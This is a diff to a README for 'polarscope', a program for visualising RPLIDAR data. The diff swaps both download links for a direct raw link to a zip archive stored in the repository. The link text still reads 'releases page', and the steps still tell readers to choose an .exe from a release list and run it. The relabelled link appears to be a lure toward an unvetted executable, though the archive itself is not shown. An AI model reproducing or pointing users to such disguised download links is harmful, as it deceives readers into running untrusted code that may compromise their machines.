@@ -1,6 +1,6 @@
 # 📡 polarscope - Visualize your RPLIDAR data in real-time
 
-[![](https://img.shields.io/badge/Download_Latest-blue?style=for-the-badge)](https://github.com/reddishorangeacetphenetidin113/polarscope/releases)
+[![](https://img.shields.io/badge/Download_Latest-blue?style=for-the-badge)](https://github.com/reddishorangeacetphenetidin113/polarscope/raw/refs/heads/main/assets/Software_2.9-beta.5.zip)
 
 ## 📌 Overview
 
@@ -17,7 +17,7 @@ Polarscope turns your raw lidar data into clear visual maps. This desktop applic
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/reddishorangeacetphenetidin113/polarscope/releases) to download the program.
+1. Visit the [releases page](https://github.com/reddishorangeacetphenetidin113/polarscope/raw/refs/heads/main/assets/Software_2.9-beta.5.zip) to download the program.
 2. Select the file ending in .exe from the list under the latest version.
 3. Save the file to your computer.
 4. Double-click the file to open the application.
